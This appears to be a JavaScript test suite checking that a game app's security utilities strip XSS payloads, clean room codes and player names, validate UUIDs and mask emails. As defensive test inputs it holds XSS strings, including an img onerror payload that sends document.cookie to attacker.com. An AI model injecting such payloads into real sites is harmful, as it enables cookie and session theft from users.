import test from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeText, sanitizeRoomCode, sanitizePlayerNames, isValidUUID, maskEmail } from '../../src/utils/securityUtils.js'

test('Security SAST: XSS & Input Sanitization Suite', async (t) => {
  await t.test('strips dangerous <script> tags from user inputs', () => {
    const malicious = '<script>alert("XSS")</script>PlayerOne'
    const clean = sanitizeText(malicious)
    assert.doesNotMatch(clean, /<script>/i)
    assert.doesNotMatch(clean, /<\/script>/i)
    assert.ok(!clean.includes('<'))
    assert.ok(!clean.includes('>'))
  })

  await t.test('neutralizes onerror event handlers and img payload injections', () => {
    const malicious = '<img src="x" onerror="document.location=\'http://attacker.com?c=\'+document.cookie">'
    const clean = sanitizeText(malicious)
    assert.strictEqual(clean, '')
    assert.doesNotMatch(clean, /onerror/i)
  })

  await t.test('strips javascript: and data: pseudo-protocols', () => {
    const malicious = 'javascript:void(0)'
    const clean = sanitizeText(malicious)
    assert.doesNotMatch(clean, /javascript:/i)
  })

  await t.test('removes null bytes used for filter evasion', () => {
    const malicious = 'Admin\0User'
    const clean = sanitizeText(malicious)
    assert.ok(!clean.includes('\0'))
  })

  await t.test('enforces strict length limits on player names', () => {
    const longString = 'A'.repeat(150)
    const clean = sanitizeText(longString, 30)
    assert.strictEqual(clean.length, 30)
  })

  await t.test('sanitizes player names array and provides non-empty fallback', () => {
    const rawNames = [
      '<script>evil()</script>',
      '   Gabriel   ',
      '<iframe src="bad.html"></iframe>',
      'Normal Player'
    ]
    const cleaned = sanitizePlayerNames(rawNames)
    assert.strictEqual(cleaned[0], 'Pemain 1')
    assert.strictEqual(cleaned[1], 'Gabriel')
    assert.strictEqual(cleaned[2], 'Pemain 3')
    assert.strictEqual(cleaned[3], 'Normal Player')
  })

  await t.test('sanitizes room codes to uppercase alphanumeric and dashes', () => {
    const rawCode = 'tru-8k2n<script>!--'
    const clean = sanitizeRoomCode(rawCode)
    assert.strictEqual(clean, 'TRU-8K2N-')
    assert.doesNotMatch(clean, /[^A-Z0-9-]/)
  })

  await t.test('validates standard UUID format accurately', () => {
    assert.strictEqual(isValidUUID('c3983279-7a54-46b0-9884-601c0bb8a69e'), true)
    assert.strictEqual(isValidUUID('not-a-uuid'), false)
    assert.strictEqual(isValidUUID('12345'), false)
    assert.strictEqual(isValidUUID(null), false)
  })

  await t.test('masks email addresses for safe logging and display', () => {
    assert.strictEqual(maskEmail('gabriel.aswinta@gmail.com'), 'g*************a@gmail.com')
    assert.strictEqual(maskEmail('test@kancasela.local'), 't**t@kancasela.local')
  })
})
